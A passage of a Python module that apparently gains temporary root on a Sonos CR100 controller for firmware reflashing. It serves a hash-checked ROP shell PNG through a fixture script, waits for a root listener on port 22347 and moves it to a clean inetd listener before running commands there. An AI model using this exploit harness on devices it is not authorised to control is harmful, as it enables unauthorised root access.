"""Temporary CR100 root access for the Pi flash workflow.

This module performs no firmware or MTD writes. ``AccessManager`` verifies the
stock HTTP identity, runs the bounded two-stage artwork fixture, and moves the
resulting RAM-only root listener from port 22347 to a clean port 22348 listener.
The caller supplies a prompt callback that waits for the user to open the
temporary room on the controller. The fixture, its Pi address, and its room are
withdrawn on both success and failure. ``close_clean_listener`` closes only
the verified temporary inetd process and is for preflash aborts; a successful
firmware reboot removes the listener itself.

The source artwork files live in ``asset_rop_dir``. They are copied to the
private ``run_dir/artwork`` directory because the fixture writes logs and PID
files beside its source. ``peer_dir`` must contain the full ``tools/zp80`` tree.
No household ID is printed by this module; fixture.log contains it and should
remain private.
"""

from __future__ import annotations

from dataclasses import dataclass, field
import hashlib
import ipaddress
import json
import os
from pathlib import Path
import re
import secrets
import shutil
import signal
import socket
import subprocess
import threading
import time
from typing import Callable
from urllib.request import urlopen
import xml.etree.ElementTree as ET

ROP_PNG_SHA256 = "5173a58755f4f092e3c34addcb9c2b6d9b4b746e209802511e3469177583c053"
ROP_FILES = (
    "run_rop_shell.sh",
    "warmup_rop_art_fixture.py",
    "fixed-rop-system-root-shell.png",
)
OLD_INETD_CONFIG = "/tmp/cve-inetd.conf"
CLEAN_INETD_CONFIG = "/tmp/cve-inetd-clean.conf"
UI_RECOVERY_SECONDS = 60
UI_ABORT_RECOVERY_SECONDS = 180
UI_STARTUP_QUIET_SECONDS = 15
UI_RECOVERY_POLL_SECONDS = 3
INETD_SETTLE_SECONDS = 2
OLD_INETD_RELEASE_SECONDS = 8
OLD_INETD_RETRY_SECONDS = 2


class AccessError(RuntimeError):
    """An identity, fixture, or controller access gate did not pass."""


class UiRecoveryError(AccessError):
    """Temporary access was aborted, or the verified recovery shell must stay open."""

    def __init__(self, message: str, *, recovery_required: bool,
                 listener_preserved: bool = False) -> None:
        super().__init__(message)
        self.recovery_required = recovery_required
        self.listener_preserved = listener_preserved


class ShellTransportError(AccessError):
    """A shell command lost its connection or timed out before its RC marker."""

    def __init__(self, message: str, partial_output: str = "") -> None:
        super().__init__(message)
        self.partial_output = partial_output


@dataclass(frozen=True)
class ShellResult:
    returncode: int
    output: str
    elapsed: float


@dataclass(frozen=True)
class ControllerIdentity:
    mac: str
    version: str
    household: str = field(repr=False)


@dataclass(frozen=True)
class BootState:
    section: int
    generation: int
    proc_mtd: str


class RootShellClient:
    """Send one ASCII command to a CR100 BusyBox ash listener.

    The command's *actual* exit status is returned by a fresh nonce-bearing
    ``echo`` after the command. The echoed input contains ``$?`` rather than a
    number, so it cannot satisfy the result parser. A missing completion marker
    raises ``ShellTransportError``; callers must treat a flash launch with such
    an outcome as uncertain and must not blindly retry it.
    """

    def __init__(self, host: str, port: int = 22348) -> None:
        self.host = str(ipaddress.IPv4Address(host))
        if not 1 <= port <= 65535:
            raise ValueError("invalid shell port")
        self.port = port

    def run(
        self,
        command: str,
        *,
        timeout: float = 35,
        connect_timeout: float = 5,
        max_output: int = 2 << 20,
    ) -> ShellResult:
        if not command or "\n" in command or "\r" in command:
            raise ValueError("shell command must be one nonempty line")
        try:
            command.encode("ascii")
        except UnicodeEncodeError as error:
            raise ValueError("shell command must be ASCII") from error
        if timeout <= 0 or connect_timeout <= 0 or max_output <= 0:
            raise ValueError("timeouts and max_output must be positive")
        nonce = secrets.token_hex(12)
        marker = f"CR100_RC_{nonce}:"
        marker_line = re.compile(
            rb"(?:^|\n)" + re.escape(marker.encode()) + rb"([0-9]{1,3})\r?(?:\n|$)"
        )
        payload = (command + "\necho " + marker + "$?\n").encode("ascii")
        started = time.monotonic()
        deadline = started + timeout
        chunks = bytearray()
        try:
            with socket.create_connection((self.host, self.port), connect_timeout) as conn:
                conn.sendall(payload)
                while time.monotonic() < deadline:
                    conn.settimeout(min(1.0, max(0.05, deadline - time.monotonic())))
                    try:
                        part = conn.recv(4096)
                    except socket.timeout:
                        continue
                    if not part:
                        break
                    chunks.extend(part)
                    if len(chunks) > max_output:
                        raise ShellTransportError(
                            "shell output exceeded limit",
                            chunks.decode("utf-8", "replace"),
                        )
                    match = marker_line.search(chunks)
                    if match:
                        return ShellResult(
                            returncode=int(match.group(1)),
                            output=chunks.decode("utf-8", "replace"),
                            elapsed=time.monotonic() - started,
                        )
        except OSError as error:
            raise ShellTransportError(
                f"shell transport failed: {error}", chunks.decode("utf-8", "replace")
            ) from error
        raise ShellTransportError(
            "shell command ended before its return-code marker",
            chunks.decode("utf-8", "replace"),
        )

    def read_proc(self, path: str, *, timeout: float = 15) -> str:
        """Return one readable /proc file between nonce-bearing boundaries."""
        if not re.fullmatch(r"/proc/[A-Za-z0-9_./-]+", path) or ".." in path:
            raise ValueError("expected a simple /proc path")
        # The old interactive ash occasionally returns a complete shell RC
        # while one read's separate output markers are missing. A fresh nonce
        # and connection make a transient framing error safe to retry.
        for attempt in range(3):
            nonce = secrets.token_hex(8)
            start, end = f"CR100_BEGIN_{nonce}", f"CR100_END_{nonce}"
            result = self.run(
                f"test -r {path} && echo {start} && cat {path} && echo && echo {end}",
                timeout=timeout,
            )
            if result.returncode:
                raise AccessError(f"could not read {path}: RC {result.returncode}")
            lines = result.output.replace("\r", "").splitlines()
            try:
                first = lines.index(start)
                last = lines.index(end, first + 1)
            except ValueError:
                if attempt < 2:
                    time.sleep(0.15)
                    continue
                raise AccessError(f"missing read boundaries for {path} after 3 attempts")
            return "\n".join(lines[first + 1 : last]).rstrip("\n")
        raise AssertionError("unreachable read retry state")


class AccessManager:
    """Orchestrate scoped artwork access and a clean temporary root listener.

    ``acquire_root(prompt_callback)`` starts the fixture, then calls the
    callback with instructions. The callback should wait until the user has
    selected Install firmware and opened Now Playing. The fixture's harmless-art
    GET is still required before this module arms the one-shot PNG. The call
    returns only after a root shell was observed and fixture cleanup completed.
    ``establish_clean_listener()`` returns ``self.shell`` on port 22348.
    """

    def __init__(
        self,
        *,
        target_ip: str,
        expected_mac: str,
        expected_version: str,
        pi_bind_ip: str,
        fixture_ip: str,
        interface: str,
        asset_rop_dir: Path,
        peer_dir: Path,
        run_dir: Path,
        fixture_mac: str = "02:00:00:00:ab:0b",
        root_port: int = 22347,
        clean_port: int = 22348,
    ) -> None:
        self.target_ip = str(ipaddress.IPv4Address(target_ip))
        self.pi_bind_ip = str(ipaddress.IPv4Address(pi_bind_ip))
        self.fixture_ip = str(ipaddress.IPv4Address(fixture_ip))
        self.expected_mac = self._normalized_mac(expected_mac)
        normalized_fixture_mac = self._normalized_mac(fixture_mac)
        if not normalized_fixture_mac.startswith("02") or normalized_fixture_mac == self.expected_mac:
            raise ValueError("fixture MAC must be a distinct locally administered unicast address")
        self.fixture_mac = ":".join(normalized_fixture_mac[index:index + 2]
                                     for index in range(0, 12, 2))
        self.fixture_udn = "RINCON_" + normalized_fixture_mac.upper() + "01400"
        self.expected_version = expected_version
        if not re.fullmatch(r"[A-Za-z0-9_.-]+", interface):
            raise ValueError("invalid interface")
        if interface != "sonos0":
            raise ValueError("bundled artwork runner requires sonos0")
        self.interface = interface
        self.asset_rop_dir = Path(asset_rop_dir)
        self.peer_dir = Path(peer_dir)
        self.run_dir = Path(run_dir)
        self.artwork_dir = self.run_dir / "artwork"
        self.root_port = root_port
        self.clean_port = clean_port
        self.identity: ControllerIdentity | None = None
        self.shell: RootShellClient | None = None
        self._fixture_runner: subprocess.Popen[bytes] | None = None
        self._fixture_launch_attempted = False
        # The web worker must not close a verified recovery channel if a
        # handoff abort failed before the stock UI came back.
        self.preserve_clean_listener = False

    @staticmethod
    def _normalized_mac(value: str) -> str:
        normalized = re.sub(r"[^0-9a-fA-F]", "", value).lower()
        if len(normalized) != 12:
            raise ValueError("invalid MAC address")
        return normalized

    @staticmethod
    def _required(result: ShellResult, action: str) -> ShellResult:
        if result.returncode:
            raise AccessError(f"{action} failed with RC {result.returncode}")
        return result

    def verify_identity(self, *, timeout: float = 5) -> ControllerIdentity:
        """Require current stock HTTP MAC/version and return the household ID."""
        url = f"http://{self.target_ip}:3400/status/hh"
        try:
            with urlopen(url, timeout=timeout) as response:
                payload = response.read(64 << 10)
        except OSError as error:
            raise AccessError(f"controller status unreachable: {error}") from error
        try:
            root = ET.fromstring(payload)
            mac = root.findtext(".//MACAddress") or ""
            version = root.findtext(".//SoftwareVersion") or ""
            household = root.findtext(".//HHID") or ""
        except ET.ParseError as error:
            raise AccessError("controller status is not valid XML") from error
        try:
            normalized_mac = self._normalized_mac(mac)
        except ValueError as error:
            raise AccessError("controller status has no valid MAC address") from error
        if normalized_mac != self.expected_mac:
            raise AccessError(f"controller MAC mismatch: {mac}")
        if version != self.expected_version:
            raise AccessError(f"controller version mismatch: {version}")
        if not household or household == "Sonos_EMULATED_CR100":
            raise AccessError("controller household ID unavailable")
        self.identity = ControllerIdentity(mac=mac, version=version, household=household)
        return self.identity

    def check_fixture_address(self) -> None:
        """Require an unused Pi alias and a negative duplicate-address probe."""
        try:
            addresses = subprocess.run(
                ["ip", "-o", "-4", "addr", "show", "dev", self.interface],
                check=True, capture_output=True, text=True,
            ).stdout
        except (OSError, subprocess.CalledProcessError) as error:
            raise AccessError(f"cannot inspect {self.interface}: {error}") from error
        if not re.search(rf"\binet {re.escape(self.pi_bind_ip)}/\d+\b", addresses):
            raise AccessError(f"Pi address {self.pi_bind_ip} is not on {self.interface}")
        if ipaddress.IPv4Address(self.fixture_ip) not in ipaddress.IPv4Network(
            f"{self.pi_bind_ip}/24", strict=False
        ):
            raise AccessError("fixture address is outside the Pi's SonosNet /24")
        if re.search(rf"\binet {re.escape(self.fixture_ip)}/\d+\b", addresses):
            raise AccessError("fixture address is already assigned")
        privilege = [] if os.geteuid() == 0 else ["sudo", "-n"]
        try:
            probe = subprocess.run(
                privilege + ["arping", "-i", self.interface, "-c", "2", self.fixture_ip],
                capture_output=True, text=True, timeout=8,
            )
        except (OSError, subprocess.TimeoutExpired) as error:
            raise AccessError(f"cannot probe fixture address: {error}") from error
        # Kali's Thomas Habets arping exits 1 when nobody answers; iputils
        # arping's duplicate-address mode uses the opposite convention. Read
        # the transmitted/received counts instead of treating RC 1 as a host.
        statistics = re.search(r"(\d+) packets transmitted, (\d+) packets received", probe.stdout)
        if not statistics or int(statistics.group(1)) < 2:
            raise AccessError("fixture address probe did not complete")
        if int(statistics.group(2)) or probe.returncode not in (0, 1):
            raise AccessError("fixture address may already be in use")

    def probe_existing_clean_shell(self) -> bool:
        """Check whether a previous RAM-only listener can be reused this boot."""
        try:
            result = RootShellClient(self.target_ip, self.clean_port).run(
                "id; uname -m", timeout=6, connect_timeout=1,
            )
        except ShellTransportError:
            return False
        if result.returncode == 0 and "uid=0(root)" in result.output and "sh4" in result.output:
            self.shell = RootShellClient(self.target_ip, self.clean_port)
            return True
        return False

    def _prepare_artwork(self) -> None:
        if self.artwork_dir.exists():
            raise AccessError(f"artwork staging already exists: {self.artwork_dir}")
        if not (self.peer_dir / "zp80_peer.py").is_file():
            raise AccessError("full ZP80 peer directory is missing")
        for relative in ("fixtures/xml/device_description.xml",
                         "fixtures/img/icon-ZP80.png",
                         "fixtures/xml/AVTransport1.xml",
                         "fixtures/xml/RenderingControl1.xml"):
            if not (self.peer_dir / relative).is_file():
                raise AccessError(f"ZP80 peer fixture missing: {relative}")
        for name in ROP_FILES:
            if not (self.asset_rop_dir / name).is_file():
                raise AccessError(f"artwork asset missing: {name}")
        payload = self.asset_rop_dir / "fixed-rop-system-root-shell.png"
        if hashlib.sha256(payload.read_bytes()).hexdigest() != ROP_PNG_SHA256:
            raise AccessError("artwork payload SHA-256 mismatch")
        self.artwork_dir.mkdir(mode=0o700, parents=False)
        for name in ROP_FILES:
            destination = self.artwork_dir / name
            shutil.copyfile(self.asset_rop_dir / name, destination)
            destination.chmod(0o600)

    def _wait_fixture_event(self, event: str, deadline: float) -> dict:
        log_path = self.artwork_dir / "fixture.log"
        decoder = json.JSONDecoder()
        while time.monotonic() < deadline:
            if self._fixture_runner and self._fixture_runner.poll() is not None:
                raise AccessError(f"artwork fixture exited before {event}")
            if log_path.exists():
                content = log_path.read_text(errors="replace")
                offset = 0
                while offset < len(content):
                    while offset < len(content) and content[offset].isspace():
                        offset += 1
                    if offset >= len(content):
                        break
                    try:
                        entry, end = decoder.raw_decode(content, offset)
                    except json.JSONDecodeError:
                        # A writer may be in the middle of a record. Re-read
                        # on the next poll; malformed prefixes are skipped.
                        next_start = content.find("{", offset + 1)
                        if next_start < 0:
                            break
                        offset = next_start
                        continue
                    if entry.get("event") == event:
                        return entry
                    offset = end
            time.sleep(0.2)
        raise AccessError(f"artwork fixture timed out waiting for {event}")

    def _fixture_pid(self) -> int:
        path = self.artwork_dir / "fixture.pid"
        try:
            pid = int(path.read_text().strip())
            cmdline = Path(f"/proc/{pid}/cmdline").read_bytes().replace(b"\0", b" ")
        except (OSError, ValueError) as error:
            raise AccessError("artwork fixture PID is unavailable") from error
        if pid <= 1 or b"warmup_rop_art_fixture.py" not in cmdline:
            raise AccessError("artwork PID does not name the expected fixture")
        if os.fsencode(str(self.artwork_dir)) not in cmdline:
            raise AccessError("artwork PID belongs to another staging directory")
        return pid

    def acquire_root(self, prompt_callback: Callable[[str], None]) -> RootShellClient:
        """Acquire port 22347 root after a harmless-art GET and user prompt."""
        if self.identity is None:
            self.verify_identity()
        self.check_fixture_address()
        self._prepare_artwork()
        runner_log = self.artwork_dir / "runner.log"
        fixture_started = time.monotonic()
        with runner_log.open("wb") as output:
            self._fixture_runner = subprocess.Popen(
                [
                    "sh", str(self.artwork_dir / "run_rop_shell.sh"),
                    str(self.artwork_dir), str(self.peer_dir), self.identity.household,
                    self.target_ip, self.fixture_ip, self.fixture_mac,
                ],
                stdin=subprocess.DEVNULL, stdout=output, stderr=subprocess.STDOUT,
            )
            self._fixture_launch_attempted = True
        try:
            ready = self._wait_fixture_event("ready", time.monotonic() + 20)
            deadline = fixture_started + min(int(ready.get("expires_in", 300)), 300)
            prompt_callback(
                "On the CR100, select Install firmware and open Now Playing; "
                "press Enter here when the screen is visible."
            )
            if self._fixture_runner.poll() is not None:
                raise AccessError("artwork fixture expired while waiting for the screen")
            self._wait_fixture_event("control-response-complete", deadline)
            fixture_pid = self._fixture_pid()
            watcher_deadline = min(deadline, time.monotonic() + 120)
            first = RootShellClient(self.target_ip, self.root_port)
            watcher_stop = threading.Event()
            probe: ShellResult | None = None

            def watch_root() -> None:
                nonlocal probe
                while not watcher_stop.is_set() and time.monotonic() < watcher_deadline:
                    try:
                        candidate = first.run("id; uname -m", timeout=5, connect_timeout=0.5)
                        if (candidate.returncode == 0 and
                                "uid=0(root)" in candidate.output and "sh4" in candidate.output):
                            probe = candidate
                            return
                    except ShellTransportError:
                        pass
                    watcher_stop.wait(0.2)

            watcher = threading.Thread(target=watch_root, name="cr100-root-watcher", daemon=True)
            watcher.start()
            try:
                os.kill(fixture_pid, signal.SIGUSR1)
                watcher.join(timeout=max(0.0, watcher_deadline - time.monotonic()))
            finally:
                watcher_stop.set()
                watcher.join(timeout=6)
            if probe is None:
                raise AccessError("root listener did not open within the bounded watcher")
            (self.artwork_dir / "root-probe.txt").write_text(probe.output)
            return first
        finally:
            self.cleanup_fixture()

    def cleanup_fixture(self) -> None:
        """Stop only this run's fixture and remove its temporary Pi address."""
        if not self._fixture_launch_attempted:
            return
        runner = self._fixture_runner
        if runner is not None:
            if runner.poll() is None:
                runner.terminate()
                try:
                    runner.wait(timeout=8)
                except subprocess.TimeoutExpired:
                    runner.kill()
                    runner.wait(timeout=3)
            self._fixture_runner = None
        try:
            child_pid = self._fixture_pid()
        except AccessError:
            child_pid = None
        if child_pid is not None:
            try:
                os.kill(child_pid, signal.SIGTERM)
            except ProcessLookupError:
                pass
            deadline = time.monotonic() + 3
            while time.monotonic() < deadline:
                try:
                    self._fixture_pid()
                except AccessError:
                    break
                time.sleep(0.1)
            else:
                try:
                    os.kill(child_pid, signal.SIGKILL)
                except ProcessLookupError:
                    pass
                time.sleep(0.1)
                try:
                    self._fixture_pid()
                except AccessError:
                    pass
                else:
                    raise AccessError("artwork fixture child remained running")
        try:
            addresses = subprocess.run(
                ["ip", "-o", "-4", "addr", "show", "dev", self.interface],
                check=True, capture_output=True, text=True,
            ).stdout
        except (OSError, subprocess.CalledProcessError) as error:
            raise AccessError(f"cannot verify fixture cleanup: {error}") from error
        if re.search(rf"\binet {re.escape(self.fixture_ip)}/24\b", addresses):
            privilege = [] if os.geteuid() == 0 else ["sudo", "-n"]
            cleanup = subprocess.run(
                privilege + ["ip", "addr", "del", f"{self.fixture_ip}/24", "dev", self.interface],
                capture_output=True, text=True,
            )
            if cleanup.returncode:
                raise AccessError("temporary artwork address remains assigned")
            try:
                addresses = subprocess.run(
                    ["ip", "-o", "-4", "addr", "show", "dev", self.interface],
                    check=True, capture_output=True, text=True,
                ).stdout
            except (OSError, subprocess.CalledProcessError) as error:
                raise AccessError(f"cannot verify artwork address removal: {error}") from error
            if re.search(rf"\binet {re.escape(self.fixture_ip)}/24\b", addresses):
                raise AccessError("temporary artwork address remains assigned")
        self._fixture_launch_attempted = False

    @staticmethod
    def _parse_inetd_processes(output: str) -> dict[int, tuple[str, ...]]:
        """Parse PID-delimited output, avoiding a command-echo false match."""
        processes: dict[int, tuple[str, ...]] = {}
        pid: int | None = None
        arguments: list[str] = []
        for raw in output.replace("\r", "").splitlines():
            line = raw.strip()
            match = re.fullmatch(r"CR100_INETD_PID:(\d+)", line)
            if match:
                if pid is not None:
                    processes[pid] = tuple(arguments)
                pid = int(match.group(1))
                arguments = []
                continue
            if line.startswith("CR100_INETD_END:") and pid is not None:
                processes[pid] = tuple(arguments)
                pid = None
                arguments = []
                continue
            if pid is not None and line and not line.startswith("# "):
                arguments.append(line)
        return processes

    def _inetd_processes(self, shell: RootShellClient) -> dict[int, tuple[str, ...]]:
        result = self._required(shell.run(
            "for p in $(pidof inetd); do echo CR100_INETD_PID:$p; "
            "strings /proc/$p/cmdline; echo CR100_INETD_END:$p; done"
        ), "inetd inventory")
        return self._parse_inetd_processes(result.output)

    @staticmethod
    def _listening_inodes(tcp: str, port: int) -> set[int]:
        """Find IPv4 LISTEN socket inodes in the controller's /proc/net/tcp."""
        inodes = set()
        for line in tcp.splitlines():
            fields = line.split()
            if len(fields) < 10 or ":" not in fields[1]:
                continue
            try:
                local_port = int(fields[1].rsplit(":", 1)[1], 16)
            except ValueError:
                continue
            if local_port != port or fields[3] != "0A":
                continue
            if not fields[9].isdigit() or int(fields[9]) <= 0:
                raise AccessError(f"cannot identify port {port} listener inode")
            inodes.add(int(fields[9]))
        return inodes

    def _process_socket_inodes(self, shell: RootShellClient, pid: int) -> set[int]:
        """Read an exact process's FD links; an unreadable list is not proof."""
        if pid <= 1:
            raise ValueError("invalid inetd PID")
        result = self._required(shell.run(
            f'test -d /proc/{pid}/fd || exit 2; '
            f'/bin/ls -l /proc/{pid}/fd/*'
        ), "inetd descriptor inventory")
        return {int(value) for value in re.findall(
            r"(?m) -> socket:\[([0-9]+)\]\r?$", result.output
        )}

    def _prove_clean_listener_fds(self, shell: RootShellClient, pid: int) -> set[int]:
        """Prove clean inetd owns 22348 but not the inherited app port 3400."""
        tcp = shell.read_proc("/proc/net/tcp")
        clean = self._listening_inodes(tcp, self.clean_port)
        held = self._process_socket_inodes(shell, pid)
        ui = self._listening_inodes(tcp, 3400)
        report = {
            "clean_pid": pid,
            "clean_listener_inodes": sorted(clean),
            "ui_listener_inodes": sorted(ui),
            "clean_owns_listener": len(clean) == 1 and clean <= held,
            "clean_holds_ui_listener": bool(held & ui),
        }
        try:
            descriptor = os.open(self.run_dir / "clean-listener-fds.json",
                                 os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
            with os.fdopen(descriptor, "w", encoding="utf-8") as output:
                json.dump(report, output, sort_keys=True)
                output.write("\n")
                output.flush()
                os.fsync(output.fileno())
        except OSError as error:
            raise AccessError("could not save clean listener descriptor proof") from error
        if len(clean) != 1:
            raise AccessError("clean inetd listener inode is missing or ambiguous")
        if not clean <= held:
            raise AccessError("clean inetd descriptor inventory did not prove its listener")
        if held & ui:
            raise AccessError("clean inetd inherited the controller UI port 3400")
        return ui

    def _record_old_listener_release(self, shell: RootShellClient, *,
                                     old_pid: int, clean_pid: int,
                                     ui_before: set[int], ui_remaining: set[int],
                                     old_args: tuple[str, ...] | None,
                                     retried: bool, released: bool,
                                     abort_cleanup: bool = False,
                                     error: str | None = None) -> None:
        """Keep private evidence when the old listener does not release promptly."""
        report = {
            "old_pid": old_pid,
            "clean_pid": clean_pid,
            "ui_listener_inodes_before": sorted(ui_before),
            "ui_listener_inodes_remaining": sorted(ui_remaining),
            "old_argv": old_args,
            "term_retried": retried,
            "released": released,
            "abort_cleanup": abort_cleanup,
        }
        if error:
            report["error"] = error
        if not released:
            for name, pid in (("old", old_pid), ("clean", clean_pid)):
                try:
                    result = shell.run(f"/bin/ls -l /proc/{pid}/fd/*", timeout=8)
                    report[name + "_fd_listing"] = result.output[:16 << 10]
                    report[name + "_fd_listing_rc"] = result.returncode
                except AccessError as error:
                    report[name + "_fd_error"] = str(error)
            try:
                result = shell.run("/bin/ps -ef", timeout=8)
                report["processes"] = result.output[:16 << 10]
            except AccessError as error:
                report["process_error"] = str(error)
            if ui_remaining:
                # One diagnostic scan only. Keep just links to the exact old
                # listener inode; raw process FDs can include unrelated data.
                try:
                    result = shell.run(
                        'for p in /proc/[0-9]*; do test -d "$p/fd" || continue; '
                        'for fd in "$p"/fd/*; do test -L "$fd" || continue; '
                        '/bin/ls -l "$fd" 2>/dev/null; done; done',
                        timeout=12, max_output=128 << 10)
                    needles = tuple(f"socket:[{inode}]" for inode in ui_remaining)
                    report["ui_inode_holders"] = [
                        line for line in result.output.splitlines()
                        if any(needle in line for needle in needles)
                    ][:64]
                except AccessError as scan_error:
                    report["ui_inode_scan_error"] = str(scan_error)
        try:
            descriptor = os.open(self.run_dir / "old-listener-release.jsonl",
                                 os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
            with os.fdopen(descriptor, "w", encoding="utf-8") as output:
                output.write(json.dumps(report, sort_keys=True) + "\n")
                output.flush()
                os.fsync(output.fileno())
        except OSError:
            # A logging failure must not substitute for the observed listener
            # state or cause the cleanup path to kill an unrelated process.
            pass

    def _save_old_listener_before_term(self, shell: RootShellClient, *,
                                       old_pid: int, ui_before: set[int]) -> set[int]:
        """Retain the old daemon's FDs and return UI sockets it actually held."""
        listing = self._required(shell.run(
            f"/bin/ls -l /proc/{old_pid}/fd/*", timeout=8),
            "old inetd pre-TERM FD inventory").output
        held = {int(value) for value in re.findall(
            r" -> socket:\[([0-9]+)\]", listing)}
        old_ui = held & ui_before
        report = {
            "old_pid": old_pid,
            "ui_listener_inodes": sorted(ui_before),
            "old_ui_listener_inodes": sorted(old_ui),
            "old_holds_ui_listener": bool(old_ui),
            "old_holds_hhkbd": " -> /dev/hhkbd" in listing,
            "old_holds_audioctl": " -> /dev/audioctl" in listing,
            "fd_listing": listing[:16 << 10],
        }
        try:
            descriptor = os.open(self.run_dir / "old-listener-before-term.json",
                                 os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
            with os.fdopen(descriptor, "w", encoding="utf-8") as output:
                json.dump(report, output, sort_keys=True)
                output.write("\n")
                output.flush()
                os.fsync(output.fileno())
        except OSError as error:
            raise AccessError("could not save old listener pre-TERM FD inventory") from error
        return old_ui

    def _wait_old_listener_released(self, shell: RootShellClient, *,
                                    old_pid: int, clean_pid: int,
                                    ui_before: set[int],
                                    allow_ui_remaining: bool = False) -> None:
        """Keep the app stopped until the old inetd and its UI socket are gone."""
        expected = (("/usr/sbin/inetd", OLD_INETD_CONFIG),
                    ("inetd", OLD_INETD_CONFIG))
        started = time.monotonic()
        deadline = started + OLD_INETD_RELEASE_SECONDS
        retried = False
        old_args: tuple[str, ...] | None = None
        ui_remaining = set(ui_before)
        while True:
            try:
                processes = self._inetd_processes(shell)
                old_args = processes.get(old_pid)
                tcp = shell.read_proc("/proc/net/tcp")
                ui_remaining = ui_before & self._listening_inodes(tcp, 3400)
            except AccessError as error:
                self._record_old_listener_release(
                    shell, old_pid=old_pid, clean_pid=clean_pid,
                    ui_before=ui_before, ui_remaining=ui_remaining,
                    old_args=old_args, retried=retried, released=False,
                    abort_cleanup=allow_ui_remaining, error=str(error))
                raise
            if old_args is not None and old_args not in expected:
                self._record_old_listener_release(
                    shell, old_pid=old_pid, clean_pid=clean_pid,
                    ui_before=ui_before, ui_remaining=ui_remaining,
                    old_args=old_args, retried=retried, released=False,
                    abort_cleanup=allow_ui_remaining)
                raise AccessError("old inetd PID changed identity during release")
            if old_args is None and not ui_remaining:
                self._record_old_listener_release(
                    shell, old_pid=old_pid, clean_pid=clean_pid,
                    ui_before=ui_before, ui_remaining=ui_remaining,
                    old_args=None, retried=retried, released=True)
                return
            if old_args is None and allow_ui_remaining:
                self._record_old_listener_release(
                    shell, old_pid=old_pid, clean_pid=clean_pid,
                    ui_before=ui_before, ui_remaining=ui_remaining,
                    old_args=None, retried=retried, released=False,
                    abort_cleanup=True)
                return
            now = time.monotonic()
            if old_args is not None and not retried and now - started >= OLD_INETD_RETRY_SECONDS:
                self._required(shell.run(
                    f"kill -TERM {old_pid} || test ! -e /proc/{old_pid}"),
                    "exact old inetd TERM retry")
                retried = True
            if now >= deadline:
                self._record_old_listener_release(
                    shell, old_pid=old_pid, clean_pid=clean_pid,
                    ui_before=ui_before, ui_remaining=ui_remaining,
                    old_args=old_args, retried=retried, released=False,
                    abort_cleanup=allow_ui_remaining)
                raise AccessError("old inetd or its original UI listener remained after TERM")
            time.sleep(0.2)

    def _handoff_event(self, event: str, **details) -> None:
        """Keep UTC event times private without changing recovery on a log error."""
        try:
            descriptor = os.open(self.run_dir / "handoff-events.jsonl",
                                 os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
            with os.fdopen(descriptor, "w", encoding="utf-8") as output:
                output.write(json.dumps({"time_unix": time.time(), "event": event,
                                         **details}, sort_keys=True) + "\n")
                output.flush()
                os.fsync(output.fileno())
        except OSError:
            pass

    def _wait_for_ui(self, seconds: float, *, quiet_seconds: float = 0,
                     poll_seconds: float = 1) -> ControllerIdentity:
        if seconds <= 0 or quiet_seconds < 0 or quiet_seconds >= seconds or poll_seconds <= 0:
            raise ValueError("invalid UI recovery wait")
        started = time.monotonic()
        deadline = started + seconds
        last = "no response"
        snapshot_taken = False
        phase = "post-marker" if quiet_seconds else "abort"
        if quiet_seconds:
            self._handoff_event("ui-quiet-start")
            time.sleep(quiet_seconds)
            self._record_ui_recovery_snapshot("ui-before-http-snapshot.json")
            self._handoff_event("ui-quiet-end")
        first_probe = True
        while time.monotonic() < deadline:
            if first_probe:
                self._handoff_event("first-http-identity-probe", phase=phase)
                first_probe = False
            try:
                identity = self.verify_identity(timeout=2)
                self._handoff_event("http-identity-returned", phase=phase)
                return identity
            except AccessError as error:
                last = str(error)
                if (not snapshot_taken and self.shell is not None and
                        time.monotonic() - started >= quiet_seconds + 10):
                    snapshot_taken = True
                    self._record_ui_recovery_snapshot()
                time.sleep(min(poll_seconds, max(0, deadline - time.monotonic())))
        self._handoff_event("http-identity-timeout", phase=phase, last_error=last)
        raise AccessError(f"controller UI unavailable after {seconds:g}s; last check: {last}")

    def _record_ui_recovery_snapshot(self, name: str = "ui-recovery-snapshot.json") -> None:
        """Save one read-only process/resource snapshot during a stalled restart."""
        if name not in ("ui-recovery-snapshot.json", "ui-before-http-snapshot.json"):
            raise ValueError("invalid UI snapshot name")
        shell = self.shell
        if shell is None:
            return
        command = ('echo CR100_PROCESSES; /bin/ps -ef; '
                   'echo CR100_TCP; cat /proc/net/tcp; '
                   'echo CR100_FILE_NR; cat /proc/sys/fs/file-nr; '
                   'echo CR100_MEMORY; cat /proc/meminfo; '
                   'echo CR100_APP_PID; '
                   'if test -r /opt/log/hh.anacapa.pid; then '
                   'app_pid=$(cat /opt/log/hh.anacapa.pid); echo "$app_pid"; '
                   'case "$app_pid" in ""|*[!0-9]*) ;; *) '
                   'cat "/proc/$app_pid/stat" 2>/dev/null ;; esac; fi')
        try:
            result = shell.run(command, timeout=12, max_output=64 << 10)
            report = {"output": result.output, "returncode": result.returncode}
        except AccessError as error:
            report = {"error": str(error)}
        try:
            descriptor = os.open(self.run_dir / name,
                                 os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
            with os.fdopen(descriptor, "w", encoding="utf-8") as output:
                json.dump(report, output, sort_keys=True)
                output.write("\n")
                output.flush()
                os.fsync(output.fileno())
        except OSError:
            pass

    def _abort_temporary_listeners(self, shell: RootShellClient,
                                   old_pid: int, clean_pid: int,
                                   ui_before: set[int] | None = None) -> None:
        """Close only the exact two RAM inetds, preserving no stop marker."""
        processes = self._inetd_processes(shell)
        old_args = ("/usr/sbin/inetd", OLD_INETD_CONFIG)
        clean_args = ("/usr/sbin/inetd", CLEAN_INETD_CONFIG)
        if processes.get(clean_pid) not in (clean_args, ("inetd", CLEAN_INETD_CONFIG)):
            raise AccessError("clean inetd identity changed before abort")
        old_live = processes.get(old_pid)
        if old_live is not None and old_live not in (old_args, ("inetd", OLD_INETD_CONFIG)):
            raise AccessError("old inetd identity changed before abort")
        if any(pid != clean_pid and args in (clean_args, ("inetd", CLEAN_INETD_CONFIG))
               for pid, args in processes.items()):
            raise AccessError("another clean inetd appeared before abort")
        if any(pid != old_pid and args in (old_args, ("inetd", OLD_INETD_CONFIG))
               for pid, args in processes.items()):
            raise AccessError("another old inetd appeared before abort")
        if old_live is not None:
            self._required(shell.run(f"kill -TERM {old_pid} || test ! -e /proc/{old_pid}"),
                           "old inetd abort")
        self._wait_old_listener_released(
            shell, old_pid=old_pid, clean_pid=clean_pid,
